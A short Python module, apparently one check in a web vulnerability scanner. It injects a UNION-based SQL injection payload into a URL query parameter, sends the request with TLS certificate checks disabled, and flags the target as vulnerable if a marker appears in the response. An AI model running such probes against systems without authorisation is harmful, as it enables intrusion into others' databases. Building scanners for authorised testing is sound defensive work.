import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from backend.injection import marker

def _mutate(url: str, param: str, payload: str) -> str:
    p = urlparse(url)
    qs = parse_qs(p.query)
    qs[param] = payload
    new_q = urlencode(qs, doseq=True)
    return urlunparse(p._replace(query=new_q))

def test(url: str, parameter: str, headers=None, timeout=8.0):
    m = marker()
    payload = f"1 UNION SELECT '{m}'-- -"
    target = _mutate(url, parameter, payload)
    try:
        r = requests.get(target, headers=headers, timeout=timeout, verify=False)
        vulnerable = m in r.text
    except Exception:
        vulnerable = False
    return {
        "url": url,
        "technique": "Union",
        "parameter": parameter,
        "payload": payload,
        "vulnerable": vulnerable,
        "severity": "High" if vulnerable else "None",
    }
